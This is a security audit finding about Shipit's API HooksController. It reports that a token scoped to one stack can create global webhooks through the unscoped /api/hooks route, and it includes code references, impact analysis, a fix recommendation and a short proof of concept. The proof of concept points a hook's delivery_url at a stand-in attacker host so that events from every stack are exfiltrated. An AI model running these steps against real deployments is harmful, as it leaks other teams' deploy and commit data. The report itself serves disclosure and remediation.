Found a concrete binding break in `Shipit::Api::HooksController`.

### Title
API token scoped to a stack can create/manage global hooks that fire for every stack - (File: app/controllers/shipit/api/hooks_controller.rb)

### Summary
An `ApiClient` can be scoped to a single stack (`stack_id` column), and `Shipit::Api::BaseController#stacks`/`#stack` enforce that scoping for every stack-nested resource by intersecting with `Stack.where(id: current_api_client.stack_id)`. However, `Shipit::Api::HooksController`, which is mounted both nested (`/api/stacks/:stack_id/hooks`) and top-level (`/api/hooks`), determines the hook's `stack_id` from `params[:stack_id]` being *present*, not from whether the authenticated client is actually authorized for that stack.

### Finding Description
`HooksController#stack_id` is:
```ruby
def stack_id
  stack.id if params[:stack_id].present?
end
```
and `stack` is inherited from `BaseController#stack`, which calls `stacks.from_param!(params[:stack_id])` — `stacks` is already filtered to the client's authorized stack when `stack_id?` is true. [1](#0-0) [2](#0-1) 

The route `resources :hooks, only: %i[index create show update destroy]` is also mounted at the *top level* (`/api/hooks`), independent of any stack scope: [3](#0-2) 

When a stack-scoped `ApiClient` (with `write:hook` permission) calls the top-level `POST /api/hooks` endpoint (no `stack_id` param), `HooksController#stack_id` returns `nil` (since `params[:stack_id].present?` is false), and `hooks.create(params)` creates a **global** `Hook` (`stack_id: nil`). Global hooks are delivered for *every* stack's events, not just the one the client is authorized for — confirmed by `Hook.for_stack(stack_id)` matching `[nil, stack_id]` and `Hook.deliver`/`Hook.emit` iterating over hooks matching any stack when global. [4](#0-3) 

This breaks the equality the permission model is meant to enforce: `client.stack_id == hook.stack_id` (the stack a token is authorized for) should equal the stack whose events the created hook can observe. Instead, a client scoped to stack A can create a hook (with an attacker-controlled `delivery_url`) that receives webhook deliveries — commit statuses, deploy/rollback events, lock events, merge events, task output metadata, etc. — for every stack in the Shipit instance, not just stack A.

### Impact Explanation
This is a cross-stack authorization escalation: a token deliberately scoped down to one stack (e.g. `here_come_the_walrus` fixture with `stack: shipit`, permission `read:stack`) — if also granted `write:hook` — can register a hook that exfiltrates deploy/task/commit state for stacks it has no visibility into, by pointing `delivery_url` at an attacker-controlled endpoint. This escalates a stack-scoped credential into read access over `Shipit.github_teams`/stack state across the whole instance, matching the High-severity class "escalation into authorization scope, unauthenticated read of stack state / task streams".

### Likelihood Explanation
Requires only a valid `ApiClient` token with `write:hook` permission that is scoped to a stack (a normal, lower-privilege token configuration intended to limit blast radius) and a single unauthenticated-looking POST to the un-scoped `/api/hooks` route rather than the scoped one — no special access or race condition needed, just calling a documented but improperly-guarded route.

### Recommendation
`HooksController#stack_id` should not derive stack-scoping only from parameter presence. It should require and use `stack.id` (from the already-scoped `stack` helper) whenever `current_api_client.stack_id?` is true, and reject (or ignore, forcing scoped) hook creation when a client is stack-scoped, regardless of whether the request path included a `stack_id`. Concretely: if `current_api_client.stack_id?`, always set `stack_id = current_api_client.stack_id` (or 403 if the request targets the unscoped route), instead of trusting `params[:stack_id].present?`.

### Proof of Concept
1. Create an `ApiClient` scoped to `stack_id: A` with permissions `['write:hook']`.
2. Authenticate as that client and send `POST /api/hooks` (top-level route, no `stack_id` segment) with `{ delivery_url: "https://attacker.example/collect", events: ["deploy", "commit_status", "task"] }`.
3. `HooksController#stack_id` returns `nil` because `params[:stack_id]` is absent → `hooks.create(params)` creates a `Hook` with `stack_id: nil` (global).
4. Any stack's deploy/commit/task events now trigger `Hook.deliver!` to the attacker's URL, even for stacks the client was never authorized to read (`current_api_client.stack_id? == A` but the hook fires for all stacks).
